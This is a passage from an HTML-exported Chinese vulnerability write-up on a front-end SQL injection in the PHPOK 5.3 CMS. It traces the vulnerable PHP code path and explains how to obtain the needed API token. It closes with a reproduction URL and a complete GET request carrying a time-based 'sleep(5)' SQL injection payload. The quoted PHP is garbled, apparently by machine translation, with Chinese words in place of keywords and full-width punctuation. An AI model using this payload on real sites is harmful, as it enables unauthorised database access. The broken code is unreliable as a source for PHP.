&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ this-&gt; cache_get</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; query</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根进</span><span class="cs8926E06">$this-&gt;query($sql);</span><span class="cs9C1B1871">：</span><span class="cs8926E06">framework / engine / db / mysqli.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">query</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PHPOK/PHPOK%205.3%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image2.png" width="560" height="217" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最终将</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">带入执行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当然，到这里，其实还有一个问题没有解决，我们需要如果拿到</span><span class="cs8926E06">token=</span><span class="cs9C1B1871">加密</span><span class="cs8926E06">(&#39;id=m_picplayer&#39;)</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">框架</span><span class="cs8926E06">/ API / index_control.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">token_f</span></p><p class="cs3A447A38"><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; config</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;is_ajax&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">true</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">$ this-&gt; site [&#39;api_code&#39;]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; error</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">P_Lang</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo;</span><span class="cs7FFD2630">系统未配置接口功能</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ id = $ this-&gt; get</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;id&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;system&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; error</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">P_Lang</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">未指定数据调用标识</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;call&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; site_id</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; site [&#39;id&#39;]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">限制范围，其中</span><span class="cs9FB05234">identifier = $ id </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ rs = $ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;call&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; get_one</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;identifier&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">$ rs ||</span><span class="cs7FFD2630">！</span><span class="cs9FB05234">$ rs [&#39;status&#39;]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; error</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">P_Lang</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">标识不存在或未启用</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;// 141</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ array = array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;id&#39;=&gt; $ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;param&#39;=&gt; $ param</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ token = $ this-&gt; lib</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;token&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; encode</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ array</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; success</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ token</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中第一个如果条件需要在后台生成</span><span class="cs8926E06">api</span><span class="cs9C1B1871">字符串：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PHPOK/PHPOK%205.3%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="305" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">没开启的话，其实构造一个</span><span class="cs8926E06">csrf</span><span class="cs9C1B1871">的</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">也是可以的</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二个条件预期</span><span class="cs8926E06">id=m_picplayer</span><span class="cs9C1B1871">即可</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/api.php?c=index&amp;f=token&amp;id=m_picplayer</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PHPOK/PHPOK%205.3%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="148" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">POC</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /api.php?c=index&amp;f=phpok&amp;token=6318fdtC3WRpOzYNzKVNw78PFa9OhFea5pp3/uZ4U3T67a/F47WhJ0lr856V7yomOcG0u8/UJpIwKKOwJAKspTSWN+5ljVNWR5978g7HHoG14M&amp;ext[sqlext]=sleep(5)%23&amp;ext[site]=1 HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Pragma: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.86 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><h2 class="cs868C439D">
			<a name="四、参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/6830"><span class="cs4B51D5E4">https://xz.aliyun.com/t/6830</span></a></span></p></body>
</html>
